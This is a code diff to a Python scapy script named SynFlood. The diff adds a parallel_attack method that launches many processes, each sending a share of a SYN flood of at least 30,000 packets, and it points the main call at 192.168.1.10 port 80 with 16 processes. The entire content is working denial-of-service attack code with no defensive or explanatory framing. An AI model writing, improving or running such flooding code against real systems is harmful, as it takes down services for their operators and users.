@@ -1,5 +1,7 @@
 from scapy.layers.inet import TCP, IP
 from scapy.sendrecv import send
+from multiprocessing import Pool, Process
+from math import ceil
 import os
 
 
@@ -27,5 +29,14 @@ class SynFlood:
         for _ in range(number_packets):
             self.send_syn_packet()
 
+    def parallel_attack(self, num_processes, min_number_packets=30000):
+        print(f"Attacking {self.target_ip} on port {self.target_port} with {num_processes} processes")
+        packets_per_process = ceil(min_number_packets / num_processes)
+        processes = []
+        for _ in range(num_processes):
+            process = Process(target=self.attack, args=(packets_per_process,))
+            process.start()
+            processes.append(process)
+
 if __name__ == '__main__':
-    SynFlood("192.168.0.10", 80, "0.0.0.0", 12345).attack(50000)
+    SynFlood("192.168.1.10", 80, "0.0.0.0", 12345).parallel_attack(16)
